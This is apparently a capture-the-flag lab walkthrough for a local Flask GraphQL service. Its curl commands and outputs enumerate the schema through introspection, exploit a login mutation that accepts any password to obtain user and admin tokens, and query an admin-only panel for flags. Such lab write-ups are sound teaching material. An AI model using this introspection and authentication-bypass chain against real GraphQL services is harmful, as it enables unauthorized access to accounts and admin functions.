# Walkthrough: graphql-injection

## Setup

```bash
docker compose up --build -d
```

Wait ~3 seconds for the Flask server to start.

## Step 1: probe the endpoint

The homepage shows the GraphQL endpoint and an example introspection query:

```bash
curl -s http://127.0.0.1:8086/
```

## Step 2: enumerate the schema via introspection

```bash
curl -s -X POST http://127.0.0.1:8086/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { fields { name description } } mutationType { fields { name description args { name } } } } }"}'
```

Output (trimmed):

```json
{
  "data": {
    "__schema": {
      "queryType": {"fields": [
        {"name":"products","description":null},
        {"name":"product","description":null},
        {"name":"me","description":null},
        {"name":"adminPanel","description":"Admin-only endpoint"}
      ]},
      "mutationType": {"fields": [
        {"name":"login","description":null,"args":[{"name":"username"},{"name":"password"}]}
      ]}
    }
  }
}
```

Two targets: `login` mutation and `adminPanel` query.

## Step 3: flag 1 via broken login mutation

```bash
curl -s -X POST http://127.0.0.1:8086/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { login(username:\"alice\",password:\"wrong\") { token role flag } }"}'
```

```json
{"data":{"login":{"token":"tok_alice_7f3a","role":"user","flag":"POC{...}"}}}
```

Flag 1 is in the `flag` field.

## Step 4: flag 2 via admin token

Get admin token (same broken mutation):

```bash
curl -s -X POST http://127.0.0.1:8086/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { login(username:\"admin\",password:\"x\") { token role } }"}'
```

```json
{"data":{"login":{"token":"tok_admin_9b2c","role":"admin"}}}
```

Call `adminPanel` with admin token:

```bash
curl -s -X POST http://127.0.0.1:8086/graphql \
  -H 'Content-Type: application/json' \
  -H 'X-Auth-Token: tok_admin_9b2c' \
  -d '{"query":"{ adminPanel { username role flag } }"}'
```

```json
{"data":{"adminPanel":{"username":"admin","role":"admin","flag":"POC{...}"}}}
```

## Attack chain

```
introspection -> schema reveals: login mutation + adminPanel query
      |
      v
login(username="alice", password="wrong") -> token + FLAG1
      |
      v
login(username="admin", password="x")    -> admin token
      |
      v
adminPanel { flag } with admin token     -> FLAG2
```

## Tools used

| Tool | Purpose |
|------|---------|
| curl | Send GraphQL queries |
| GraphQL introspection | Enumerate schema to find mutations and admin-only queries |
